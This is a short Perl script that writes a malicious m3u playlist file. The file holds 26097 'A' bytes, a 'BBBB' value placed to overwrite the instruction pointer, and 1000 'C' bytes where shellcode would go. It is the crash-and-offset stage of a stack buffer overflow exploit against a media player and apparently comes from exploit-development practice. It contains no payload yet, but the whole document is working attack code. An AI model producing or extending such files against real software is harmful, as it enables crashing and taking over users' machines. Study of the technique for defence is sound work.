#!/usr/bin/env perl

my $file= "eipcrash.m3u";
my $junk= "A" x 26097;
my $eip = "BBBB";
my $espdata = "C" x 1000;
open($FILE,">$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
